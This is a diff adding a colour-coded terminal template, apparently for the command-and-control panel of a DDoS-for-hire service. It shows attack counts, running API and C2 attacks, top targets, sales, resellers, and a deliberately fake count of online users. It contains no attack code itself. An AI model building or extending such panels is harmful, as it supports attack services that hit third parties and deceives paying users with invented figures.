@@ -1,0 +1,36 @@
+<<clear()>>
+<<full_screen_custom(76x37)>>
+
+    [38;5;34mUSER STATISTICS[0m<<sleep(100)>>
+  ├── [38;5;255mUsername[0m                [38;5;046m:[38;5;255m [38;5;255m<<$user.username>>[0m<<sleep(100)>>
+  ├── [38;5;255mFirst Login Date[0m        [38;5;046m:[38;5;255m [38;5;255m<<$user.first_login_date>>[0m<<sleep(100)>>
+  ├── [38;5;255mTotal Attacks Count[0m     [38;5;046m:[38;5;255m [38;5;255m<<$user.attacks_count>>[0m<<sleep(100)>>
+  ├── [38;5;255mActivity Days Count[0m     [38;5;046m:[38;5;255m [38;5;255m<<$user.activity_days_count>>[0m<<sleep(100)>>
+  ├── [38;5;255mLongest Attack Target[0m   [38;5;046m:[38;5;255m [38;5;255m<<$user.longest_attack_target>>[0m<<sleep(100)>>
+  ├── [38;5;255mDaily Usage Summary[0m     [38;5;046m:[38;5;255m [38;5;255m<<$user.daily_usage_summary>>[0m<<sleep(100)>>
+  ├── [38;5;255mLogin Count[0m             [38;5;046m:[38;5;255m [38;5;255m<<$user.login_count>>[0m<<sleep(100)>>
+  └── [38;5;255mAPI & C2 Attacks [0m       [38;5;046m:[38;5;255m API[38;5;046m:[38;5;255m [38;5;255m<<$user.total_attack_api>>[0m, C2[38;5;046m:[38;5;255m [38;5;255m<<$user.total_attack_c2>>[0m<<sleep(100)>>
+
+    [38;5;045mGLOBAL STATISTICS[0m<<sleep(100)>>
+  ├── [38;5;255mTotal Online Users[0m      [38;5;046m:[38;5;255m [38;5;255m<<$fake_online>>[0m<<sleep(100)>>    
+  ├── [38;5;255mTotal Users[0m             [38;5;046m:[38;5;255m [38;5;255m<<$total_users>>[0m<<sleep(100)>>
+  ├── [38;5;255mExpired Users[0m           [38;5;046m:[38;5;255m [38;5;255m<<$total_expired_users>>[0m<<sleep(100)>>
+  ├── [38;5;255mActive Users[0m            [38;5;046m:[38;5;255m [38;5;255m<<$total_active_users>>[0m<<sleep(100)>>
+  ├── [38;5;255mNo Active Users[0m         [38;5;046m:[38;5;255m [38;5;255m<<$total_no_active_users>>[0m<<sleep(100)>>
+  ├── [38;5;255mNew Users Today[0m         [38;5;046m:[38;5;255m [38;5;255m<<$global_new_users_today>>[0m<<sleep(100)>>
+  ├── [38;5;255mTotal Purchase[0m          [38;5;046m:[38;5;255m [38;5;255m<<$global_total_purchases>>[0m<<sleep(100)>>
+  ├── [38;5;255mTotal Purchase To Day[0m   [38;5;046m:[38;5;255m [38;5;255m<<$global_purchase_today>>[0m<<sleep(100)>>
+  ├── [38;5;255mRunning Attacks[0m         [38;5;046m:[38;5;255m API[38;5;046m:[38;5;255m [38;5;255m<<$all_ongoing_api>>[0m, C2[38;5;046m:[38;5;255m [38;5;255m<<$all_ongoing_c2>>[0m <<sleep(100)>>
+  └── [38;5;255mPeak User Activity[0m      [38;5;046m:[38;5;255m [38;5;255m<<$global_peak_user_activity>>[0m<<sleep(100)>>
+
+    [38;5;196mADDITIONAL STATISTICS[0m<<sleep(100)>>
+  ├── [38;5;255m<<$cnc_name>> Uptime[0m[38;5;046m:[38;5;255m [38;5;255m<<$uptime_cnc>>[0m<<sleep(100)>>
+  ├── [38;5;255mMost used Payment Method[0m[38;5;046m:[38;5;255m [38;5;255m<<$global_most_used_payment>>[0m<<sleep(100)>>
+  ├── [38;5;255mTop Reseller Activity[0m   [38;5;046m:[38;5;255m [38;5;255m<<$top_reseller_activity>>[0m<<sleep(100)>>
+  ├── [38;5;255mGlobal Top Target Today[0m [38;5;046m:[38;5;255m [38;5;255m<<$global_top_target_today>>[0m<<sleep(100)>>
+  ├── [38;5;255mPeak Attack Hour (Today)[0m[38;5;046m:[38;5;255m [38;5;255m<<$attack_peak_hour_today>>[0m<<sleep(100)>>
+  ├── [38;5;255mLeast Used Method[0m       [38;5;046m:[38;5;255m [38;5;255m<<$attack_method_least_used>>[0m<<sleep(100)>>
+  ├── [38;5;255mGlobal Top Target Today [38;5;046m:[38;5;255m [38;5;255m<<$global_top_target_today>>[0m<<sleep(100)>>
+  └── [38;5;255mTotal Methods Available[0m [38;5;046m:[38;5;255m [38;5;255m<<$attack_methods_availability>>[0m<<sleep(100)>>
+
+[38;5;255mTop Method Usage[0m  [38;5;255mGlobal Top Target Today[0m[38;5;046m :[38;5;255m [38;5;255m<<$global_top_target_today>>[0m<<sleep(100)>><<top_methods_usage()>>
